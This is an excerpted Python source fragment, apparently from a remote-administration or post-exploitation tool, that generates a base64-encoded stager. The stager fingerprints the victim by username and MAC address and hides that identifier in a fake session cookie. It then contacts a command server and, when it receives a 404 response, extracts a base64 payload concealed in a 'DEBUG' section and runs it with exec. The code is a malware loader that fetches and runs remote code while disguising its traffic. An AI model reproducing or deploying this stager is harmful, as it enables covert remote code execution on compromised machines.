...
def create_stager(server_host, loader_options):
    """
    ...
    stager_host = "{}".format(server_host)
...
def get_uid():
    return hexlify((getpass.getuser() + "-" + str(getnode())).encode())


{0} = "{1}"
data = {{
    "Cookie": "session=" + b64encode(get_uid()).decode() + "-{2}",
    "User-Agent": "{3}"
}}

try:
    request = urllib.request.Request("{4}/sendcommand", headers=data)
    urllib.request.urlopen(request).read()
except urllib.error.HTTPError as ex:
    if ex.code == 404:
        processed = ex.read().decode().split("DEBUG:\\n")[1].replace("DEBUG-->", "")
        exec(b64decode(processed.encode()).decode())
    else:
        raise
    """.format(
        ...
        b64encode("{}".format(json.dumps({
            "type": 0,
            "payload_options": {"host": server_host},
    ...
    return (b64encode(stager_code.encode()).decode())
